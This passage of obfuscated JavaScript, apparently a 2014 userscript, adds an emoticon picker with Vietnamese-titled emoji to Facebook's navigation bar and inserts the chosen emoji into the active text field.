        "\x6E\x61\x6D\x65": 'Ho\xE0ng t\u1EED ba t\u01B0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC83 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ex',
        "\x6E\x61\x6D\x65": 'Con ch\xFAa ba l\u0103m'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC85 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ey',
        "\x6E\x61\x6D\x65": 'S\u01A1n m\xF3ng tay ph\xE1t'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC8B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ez',
        "\x6E\x61\x6D\x65": 'Y\xEAu mi\u1EBFng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC8F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e-',
        "\x6E\x61\x6D\x65": 'B\u1ECDn m\xECnh h\xF4n cmn nhau \u0111\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC90 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e_',
        "\x6E\x61\x6D\x65": 'Hoa h\xF2e'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC91 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f0',
        "\x6E\x61\x6D\x65": 'B\u1ECDn m\xECnh trao tim cmn cho nhau \u0111\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC93 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f1',
        "\x6E\x61\x6D\x65": 'C\u1ED1 b\u1EAFt Wifi tr\xE1i tim em m\u1EDBi \u0111\u01B0\u1EE3c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC94 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f2',
        "\x6E\x61\x6D\x65": 'Tim t\xF4i v\u1EE1 cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC96 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f3',
        "\x6E\x61\x6D\x65": 'Tim t\xF4i tan ch\u1EA3y cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC97 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f4',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 1'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC98 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f5',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC99 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f6',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f7',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 4'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f8',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 5'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f9',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 6'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fa',
        "\x6E\x61\x6D\x65": 'Ch\xF3i cm tim th\xEDm l\u1EA1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA2 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fb',
        "\x6E\x61\x6D\x65": 'M\u1EA1ng nh\u1EC7n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA4 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fc',
        "\x6E\x61\x6D\x65": 'Ng\u1EE7 th\xF4i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA6 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fd',
        "\x6E\x61\x6D\x65": 'Phun'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA8 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fe',
        "\x6E\x61\x6D\x65": 'Gi\xF3 th\u1ED5i vi vu'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA9 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ff',
        "\x6E\x61\x6D\x65": 'Shit'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCAA ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fg',
        "\x6E\x61\x6D\x65": 'C\u1EE9ng th\u1EBF n\xE0y \u01B0ng kh\xF4ng?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBB ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fh',
        "\x6E\x61\x6D\x65": 'M\xE1y t\xEDnh m\u1EDBi t\u1EADu'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBD ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fi',
        "\x6E\x61\x6D\x65": 'CD nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBE ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fj',
        "\x6E\x61\x6D\x65": '\u1ED4n c\u1EE9ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBF ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fk',
        "\x6E\x61\x6D\x65": '\u0110ia tr\u1EAFng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCC0 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fl',
        "\x6E\x61\x6D\x65": 'DVD'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCDE ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fm',
        "\x6E\x61\x6D\x65": 'Anh nghe'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCE0 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fn',
        "\x6E\x61\x6D\x65": 'C\xF3 g\xEC c\u1EE9 g\u1EEDi Fax cho anh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCF1 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fo',
        "\x6E\x61\x6D\x65": 'Iphone 9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCF2 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fp',
        "\x6E\x61\x6D\x65": 'Iphone 9s'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCFA ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fq',
        "\x6E\x61\x6D\x65": '\u0110ang xem TIVI'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDD14 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fr',
        "\x6E\x61\x6D\x65": 'Chu\xF4ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE01 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fs',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE02 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ft',
        "\x6E\x61\x6D\x65": 'Kh\xF3c cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE03 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fu',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE04 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fv',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE06 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fw',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE09 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fx',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 4'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fy',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 5'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fz',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 6'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f-',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 7'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f_',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 8'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE12 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g0',
        "\x6E\x61\x6D\x65": 'Ch\xE1n vl'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE13 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g1',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE14 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g2',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 10'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE16 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g3',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 11'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE18 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g4',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 12'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g5',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 13'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g6',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 14'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g7',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 15'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g8',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 16'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE20 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g9',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 17'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE21 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ga',
        "\x6E\x61\x6D\x65": 'M\u01A1 ka \u0111\u1EC1, ch\u1ECB n\xF3ng r\u1ED3i \u0111\u1EA5y nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE22 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gb',
        "\x6E\x61\x6D\x65": 'Huhu...'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE23 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gc',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 18'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE24 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gd',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 19'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE25 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ge',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 20'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE28 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gf',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 21'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE29 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gg',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 22'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE2A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gh',
        "\x6E\x61\x6D\x65": 'Ng\u1EE7 cmnr nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE2B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gi',
        "\x6E\x61\x6D\x65": 'H\xF4m nay m\u1EC7t vl'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE2D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gj',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 23'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE30 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gk',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 24'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE31 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gl',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 25'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE32 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gm',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 26'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE33 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gn',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 27'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE35 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2go',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 28'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE37 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gp',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 29'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE38 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gq',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 30'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE39 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gr',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 31'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gs',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 32'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gt',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 33'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gu',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 34'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gv',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 35'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gw',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 36'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE40 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gx',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 37'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gy',
        "\x6E\x61\x6D\x65": '\u0110\u1ED1 bi\u1EBFt tay tr\xE1i hay ph\u1EA3i?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gz',
        "\x6E\x61\x6D\x65": 'Tay \u1EA3i tay ai?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g-',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 38'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g_',
        "\x6E\x61\x6D\x65": 'L\xEAn l\xE0 l\xEAn l\xEAn lu\xF4n'
    }, {
        "\x63\x68\x61\x72\x73": ' \u261D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h0',
        "\x6E\x61\x6D\x65": 'D\u1EB9p ra \u0111\u1EC3 anh l\xEAn'
    }, {
        "\x63\x68\x61\x72\x73": ' \u263A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h1',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 39'
    }, {
        "\x63\x68\x61\x72\x73": ' \u26A1 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h2',
        "\x6E\x61\x6D\x65": 'B\u1ECB gi\u1EADt s\xE9t cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \u26C4 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h3',
        "\x6E\x61\x6D\x65": 'Ng\u01B0\u1EDDi tuy\u1EBFt, Sapa m\xF9a \u0111\xF4ng 2013'
    }, {
        "\x63\x68\x61\x72\x73": ' \u270A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h4',
        "\x6E\x61\x6D\x65": 'N\u0103m 2014 quy\u1EBFt t\xE2m c\xF3 G\u1EA4U'
    }, {
        "\x63\x68\x61\x72\x73": ' \u270B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h5',
        "\x6E\x61\x6D\x65": 'Tay ph\u1EA3i nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' \u270C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h6',
        "\x6E\x61\x6D\x65": '2, l\xE0m g\u1EA5u c\u1EE7a t\u1EDB nh\xE9?'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2600 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h7',
        "\x6E\x61\x6D\x65": 'N\u1EAFng l\xEAn r\u1ED3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2601 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h8',
        "\x6E\x61\x6D\x65": 'M\xE2y tr\xF4i'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2614 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h9',
        "\x6E\x61\x6D\x65": 'Th\xF4i ch\u1EBFt, m\u01B0a cmnr, \xF4 \u0111\xE2u \xF4 \u0111\xE2u?'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2615 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ha',
        "\x6E\x61\x6D\x65": 'L\xE0m c\u1ED1c Cafe cho t\u1EC9nh t\xE1o, haizzz'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2728 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2hb',
        "\x6E\x61\x6D\x65": 'B\u1ECB hoa m\u1EAFt cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2764 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2hc',
        "\x6E\x61\x6D\x65": 'T\xF4i y\xEAu b\u1EA1n'
    }];
    var _0x3384x2 = document['activeElement'];
 
    function _0x3384x3(_0x3384x4) {
        var _0x3384x5 = document['createElement']('div');
        _0x3384x5['innerHTML'] = _0x3384x4;
        return _0x3384x5['firstChild'];
    };
 
    function _0x3384x6(_0x3384x7) {
        var _0x3384x8 = document['createElement']('div');
        var _0x3384x9 = document['createTextNode'](_0x3384x7);
        _0x3384x8['appendChild'](_0x3384x9);
        return _0x3384x8['innerHTML'];
    };
 
    function _0x3384xa(_0x3384xb) {
        return (_0x3384xb instanceof HTMLInputElement && _0x3384xb['type'] == 'text') || _0x3384xb instanceof HTMLTextAreaElement;
    };
 
    function _0x3384xc(_0x3384xd) {
        return _0x3384xd['className'] == 'openToggler';
    };
 
    function _0x3384xe(_0x3384xd, _0x3384xf) {
        if (_0x3384xf === undefined) {
            _0x3384xf = !_0x3384xc(_0x3384xd);
        };
        if (_0x3384xf) {
            _0x3384xd['className'] = 'openToggler';
        } else {
            _0x3384xd['removeAttribute']('class');
        };
    };
 
    function _0x3384x10(_0x3384x11, _0x3384x12) {
        var _0x3384x4;
        _0x3384x4 = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
        _0x3384x4 += '<div class="jewelFlyout">';
        _0x3384x4 += '</div>';
        _0x3384x4 += '</li>';
        var _0x3384x13 = _0x3384x3(_0x3384x4);
        _0x3384x11['appendChild'](_0x3384x13);
        _0x3384x4 = '<div style="display: none;">';
        _0x3384x4 += '</div>';
        var _0x3384x14 = _0x3384x3(_0x3384x4);
        _0x3384x12['appendChild'](_0x3384x14);
        (function (_0x3384x14) {
            _0x3384x13['addEventListener']('click', function () {
                var _0x3384x15 = this['parentNode']['childNodes'];
                for (var _0x3384x16 = 0; _0x3384x16 < _0x3384x15['length']; _0x3384x16++) {
                    if (_0x3384x15[_0x3384x16] === this) {} else {
                        _0x3384x15[_0x3384x16]['style']['background'] = '';
                        _0x3384x15[_0x3384x16]['firstChild']['style']['color'] = '';
                    };
                };
                var _0x3384x17 = _0x3384x14['parentNode']['childNodes'];
                for (var _0x3384x18 = 0; _0x3384x18 < _0x3384x17['length']; _0x3384x18++) {
                    if (_0x3384x17[_0x3384x18] === _0x3384x14) {
                        _0x3384x14['style']['display'] = '';
                    } else {
                        _0x3384x17[_0x3384x18]['style']['display'] = 'none';
                    };
                };
            });
        })(_0x3384x14);
        return {
            "\x74\x69\x74\x6C\x65": _0x3384x13['firstChild'],
            "\x62\x6F\x64\x79": _0x3384x14
        };
    };
 
    function _0x3384x19(_0x3384x1, _0x3384x1a) {
        var _0x3384x4;
        _0x3384x4 = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
        _0x3384x4 += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
        _0x3384x4 += '</div>';
        _0x3384x4 += '</div>';
        var _0x3384x14 = _0x3384x3(_0x3384x4)['firstChild'];
        for (var _0x3384x1b = 0; _0x3384x1b < _0x3384x1['length']; _0x3384x1b++) {
            var _0x3384x1c = _0x3384x1[_0x3384x1b];
            if (!_0x3384x1a(_0x3384x1c)) {
                continue;
            };
            _0x3384x4 = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
            _0x3384x4 += '<a';
            _0x3384x4 += ' class="emoticon' + (_0x3384x1c['class'] !== undefined ? ' ' + _0x3384x1c['class'] : '') + '"';
            _0x3384x4 += ' style="text-decoration: inherit; color: inherit;' + (_0x3384x1c['class'] !== undefined ? ' color: transparent;' : ' width: auto;') + '"';
            _0x3384x4 += (_0x3384x1c['name'] !== undefined ? ' title="' + _0x3384x1c['name'] + '"' : '');
            _0x3384x4 += '>';
            _0x3384x4 += _0x3384x6(_0x3384x1c['chars']);
            _0x3384x4 += '</a>';
            _0x3384x4 += '</span>';
            var _0x3384x1d = _0x3384x3(_0x3384x4);
            _0x3384x14['appendChild'](_0x3384x1d);
            var _0x3384x1e = _0x3384x1d['firstChild'];
            (function (_0x3384x1c) {
                _0x3384x1e['addEventListener']('click', function () {
                    if (_0x3384xa(_0x3384x2)) {
                        _0x3384x2['focus']();
                        var _0x3384x1f = _0x3384x1c['chars'];
                        var _0x3384x20 = _0x3384x2['value'];
                        var _0x3384x21 = _0x3384x2['selectionStart'];
                        var _0x3384x22 = _0x3384x2['selectionEnd'];
                        _0x3384x2['value'] = _0x3384x20['substring'](0, _0x3384x21) + _0x3384x1f + _0x3384x20['substring'](_0x3384x22);
                        _0x3384x2['setSelectionRange'](_0x3384x21 + _0x3384x1f['length'], _0x3384x21 + _0x3384x1f['length']);
                    };
                    openFlyoutCommand = false;
                });
            })(_0x3384x1c);
        };
        return _0x3384x14['parentNode'];
    };
    var _0x3384x4;
    _0x3384x4 = '<li class="navItem middleItem notifNegativeBase">';
    _0x3384x4 += '<div class="fbJewel">';
    _0x3384x4 += '<a class="navLink" title="Icon Facebook 2014">';
    _0x3384x4 += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img> Icon Facebook</span>';
    _0x3384x4 += '</a>';
    _0x3384x4 += '<div>';
    _0x3384x4 += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
    _0x3384x4 += '<div class="jewelBeeperHeader">';
    _0x3384x4 += '<div class="beeperNubWrapper">';
    _0x3384x4 += '<div class="beeperNub" style="left: 4px;"></div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '<ul style="display: text-align: center;">';
    _0x3384x4 += '</ul>';
    _0x3384x4 += '<div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '<div class="jewelFooter">';
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/01pevkut" target="_blank">Smile</a>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</li>';
    var _0x3384x23 = _0x3384x3(_0x3384x4);
    var _0x3384x24 = document['querySelector']('#pageNav');
    _0x3384x24['insertBefore'](_0x3384x23, _0x3384x24['firstChild']);
    _0x3384x23['addEventListener']('click', function () {
        if (_0x3384xa(_0x3384x2)) {
            _0x3384x2['focus']();
        };
        openFlyoutCommand = undefined;
    }, true);
    var _0x3384x25 = _0x3384x23['firstChild']['firstChild'];
    var _0x3384xd = _0x3384x25['nextSibling'];
    var _0x3384x11 = _0x3384xd['firstChild']['childNodes'][1];
    var _0x3384x12 = _0x3384x11['nextSibling'];
    _0x3384x25['addEventListener']('click', function () {
        openFlyoutCommand = !_0x3384xc(_0x3384xd);
    });
    var _0x3384x26 = _0x3384x10(_0x3384x11, _0x3384x12);
    _0x3384x26['title']['click']();
    _0x3384x26['body']['appendChild'](_0x3384x19(_0x3384x1, function (_0x3384x1c) {
        if (_0x3384x1c['class'] === undefined) {
            return false;
        };
        if (_0x3384x1c['chars']['length'] == 2) {
            return false;
        };
        return true;
    }));
    document['addEventListener']('click', function () {
        _0x3384x2 = document['activeElement'];
        if (openFlyoutCommand !== undefined) {
            _0x3384xe(_0x3384xd, openFlyoutCommand);
        };
        openFlyoutCommand = false;
    });
})();
//11111CoderLike
